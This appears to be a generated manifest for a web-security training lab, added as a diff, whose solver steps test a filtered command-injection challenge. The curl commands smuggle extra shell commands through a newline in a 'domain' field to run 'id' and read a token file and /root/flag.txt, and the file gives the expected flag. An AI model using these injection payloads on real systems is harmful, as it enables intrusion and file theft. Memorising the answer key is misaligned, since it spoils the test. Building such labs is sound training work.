@@ -1,0 +1,40 @@
+# Generated from platform/labs/Web/web-2-5-filtered-injection/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-2-5-filtered-injection
+track: Web
+difficulty: intermediate
+source: platform/labs/Web/web-2-5-filtered-injection/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-2-5-filtered-injection.sh
+  steps:
+  - name: Web application responds
+    command: curl -s http://{target.webapp}/ | grep -ci 'truenorth' | awk '{print ($1>=1)?"ok":"none"}'
+    expect: ok
+  - name: Normal DNS lookup works
+    command: curl -s -d 'domain=example.com' http://{target.webapp}/lookup | grep -c 'Server'
+    expect: '1'
+  - name: Newline injection executes id
+    command: curl -s -d 'domain=example.com%0aid' http://{target.webapp}/lookup | grep -c 'uid'
+    expect: '1'
+  - name: Extract token 1 via newline injection
+    command: curl -s -d 'domain=example.com%0acat /opt/truenorth/hidden_config/token1.txt' http://{target.webapp}/lookup | grep -oE 'f1lt3r_byp4ss' | head -1
+    expect: f1lt3r_byp4ss
+  - name: Extract token 2 via newline injection
+    command: curl -s -d 'domain=example.com%0acat /root/flag.txt' http://{target.webapp}/lookup | grep -oE 'pwn3d' | head -1
+    expect: pwn3d
+  - name: Verify complete flag
+    command: echo 'OCR{f1lt3r_byp4ss_pwn3d}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{f1lt3r_byp4ss_pwn3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
